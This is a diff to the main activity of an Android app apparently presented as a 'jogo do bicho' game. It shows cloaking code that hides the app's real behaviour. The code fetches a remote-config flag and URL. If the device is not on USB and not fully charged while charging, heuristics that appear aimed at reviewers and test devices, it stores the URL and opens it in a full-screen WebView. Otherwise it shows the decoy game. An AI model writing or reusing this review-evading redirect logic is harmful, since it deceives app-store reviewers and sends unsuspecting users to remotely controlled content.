@@ -1,12 +1,10 @@
 package jogo.dobicho.games
 
 import android.content.pm.ActivityInfo
-import android.net.Uri
 import android.os.Bundle
 import androidx.annotation.ColorRes
 import androidx.annotation.IdRes
 import androidx.appcompat.app.AppCompatActivity
-import androidx.browser.customtabs.CustomTabsIntent
 import androidx.core.content.ContextCompat
 import androidx.navigation.NavController
 import androidx.navigation.findNavController
@@ -36,12 +34,11 @@ import kotlinx.coroutines.launch
 import org.json.JSONObject
 import kotlin.system.exitProcess
 
-var f = true
 class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
 
     companion object {
-        const val Wdc = 146
-        var URL_Wdc = "https://stackoverflow.com/"
+        const val Tunella = 235
+        var tuNellaUrL    = ""
 
         val startFragmentID = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
     }
@@ -53,6 +50,8 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
     private lateinit var navController: NavController
 
     lateinit var lottie          : Lottie
+    val tunella = TunellaFragment(this)
+
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -63,7 +62,7 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
             asyncCheckInternetConnection()
             lottie.showLoader()
 
-            checkDataStore()
+            checkLocalStorage()
 //            startFragmentID.tryEmit(R.id.libGDXFragment)
 //            startFragmentID.tryEmit(INTERPOL)
 
@@ -71,18 +70,31 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
                 startFragmentID.collect { fragmentId ->
                     when (fragmentId) {
                         R.id.libGDXFragment -> {
+                            tunella.goneWebView()
                             setNavigationBarColor(R.color.black)
                             setStartDestination(fragmentId)
                             ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                         }
-                        Wdc                 -> {
-                            val intent = CustomTabsIntent.Builder().build()
-                            intent.launchUrl(this@MainActivity, Uri.parse(URL_Wdc))
+                        Tunella             -> {
+                            tunella.showAndOpenUrl()
+                            setNavigationBarColor(R.color.white)
+                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                         }
-                    }
+                        else -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
+                    }.also { requestedOrientation = it }
                 }
             }
         }
+    }
+
+    override fun onResume() {
+        super.onResume()
+        tunella.onResume()
+    }
+
+    override fun onPause() {
+        tunella.onPause()
+        super.onPause()
     }
 
     override fun exit() {
@@ -101,6 +113,7 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
         setContentView(binding.root)
         navController = findNavController(R.id.nav_host_fragment)
         lottie        = Lottie(binding)
+        tunella.onCreate(coroutine, binding.tunella)
     }
 
     // ---------------------------------------------------
@@ -126,29 +139,29 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
         }
     }
 
-    private fun checkDataStore() {
+    private fun checkLocalStorage() {
         coroutine.launch(Dispatchers.IO) {
             when (DataStoreManager.Key.get()) {
-                "Wdc" -> {
+                "tunella" -> {
                     DataStoreManager.Link.get()?.let {
                         log("DataStoreManager Key = SUCCESS | link = $it")
-                        URL_Wdc = it
-                        startFragmentID.emit(Wdc)
+                        tuNellaUrL = it
+                        startFragmentID.emit(Tunella)
                     }
                 }
-                "Igrula" -> {
+                "gra" -> {
                     log("DataStoreManager Key = GAME")
                     startFragmentID.emit(R.id.libGDXFragment)
                 }
                 else -> {
                     log("DataStoreManager Key = NONE")
-                    getFirebaseData()
+                    giveConfSettings()
                 }
             }
         }
     }
 
-    private fun getFirebaseData() {
+    private fun giveConfSettings() {
         FirebaseApp.initializeApp(appContext)
 
         Firebase.remoteConfig.apply {
@@ -179,10 +192,7 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
                             tiles6_Remote?.add(layoutData)
                         }
 
-                        log("trr = $tiles6_Remote")
-
-                        log("occur: $occur | road: $road")
-                        checkParameters(occur, road)
+                        checkForSubscribe(occur, road)
                     }
                 } else {
                     startFragmentID.tryEmit(R.id.libGDXFragment)
@@ -192,27 +202,35 @@ class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {
         }
     }
 
-    private fun checkParameters(occur: Boolean, road: String) {
-        fun openAndSaveGame() {
+    private fun checkForSubscribe(
+        occur: Boolean,
+        road: String
+    ) {
+        fun goGra() {
             coroutine.launch(Dispatchers.IO) {
-                DataStoreManager.Key.update { "Igrula" }
+                DataStoreManager.Key.update { "gra" }
                 startFragmentID.tryEmit(R.id.libGDXFragment)
             }
         }
 
         if (occur) {
-            if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) openAndSaveGame()
-            else openAndSaveInterpol(road)
-        } else openAndSaveGame()
+            if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) {
+                goGra()
+            } else {
+                goTunella(road)
+            }
+        } else {
+            goGra()
+        }
     }
 
-    private fun openAndSaveInterpol(be: String) {
-        URL_Wdc = be
+    private fun goTunella(be: String) {
+        tuNellaUrL = be
 
         coroutine.launch(Dispatchers.IO) {
-            DataStoreManager.Key.update { "Wdc" }
-            DataStoreManager.Link.update { URL_Wdc }
-            startFragmentID.tryEmit(Wdc)
+            DataStoreManager.Key.update { "tunella" }
+            DataStoreManager.Link.update { tuNellaUrL }
+            startFragmentID.tryEmit(Tunella)
         }
     }
 
